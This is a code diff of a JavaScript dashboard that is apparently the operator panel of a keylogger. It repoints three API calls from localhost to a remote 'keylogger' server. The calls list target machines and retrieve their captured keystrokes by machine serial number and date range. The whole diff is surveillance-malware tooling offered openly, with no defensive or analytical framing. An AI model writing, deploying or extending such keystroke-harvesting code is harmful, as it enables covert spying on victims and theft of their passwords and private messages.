@@ -18,7 +18,7 @@ async function GetDemoLogs() {
     }
 
     try {
-        let response = await fetch("http://127.0.0.1:9734/api/get_demo", {
+        let response = await fetch("https://keylogger.shuvax.com/api/get_demo", {
             method: "GET",
             headers: {
                 "Authorization": `Bearer ${token}`
@@ -45,7 +45,7 @@ async function GetComputersList() {
     }
 
     try {
-        let response = await fetch("http://127.0.0.1:9734/api/get_target_machines_list", {
+        let response = await fetch("https://keylogger.shuvax.com/api/get_target_machines_list", {
             method: "GET",
             headers: {
                 "Authorization": `Bearer ${token}`
@@ -76,7 +76,7 @@ async function GetComputersActivity(machine_sn, start_date, end_date) {
     }
     
     try {
-        let response = await fetch("http://127.0.0.1:9734/api/get_keystrokes?machine_sn=" + machine_sn + "&start_date=" + start_date + "&end_date=" + end_date, {
+        let response = await fetch("https://keylogger.shuvax.com/api/get_keystrokes?machine_sn=" + machine_sn + "&start_date=" + start_date + "&end_date=" + end_date, {
             method: "GET",
             headers: {
                 "Authorization": `Bearer ${token}`
@@ -189,7 +189,7 @@ document.addEventListener("DOMContentLoaded", function () {
         // console.log(rowData);
         // handleRowClick(rowData);
         //corrently date format dd-mm-yyyy
-        openPopup(rowData[0], '20-02-2025', '20-02-2025');
+        openPopup(rowData[0], '23-02-2025', '23-02-2025');
     });
 
     function handleRowClick(data) {
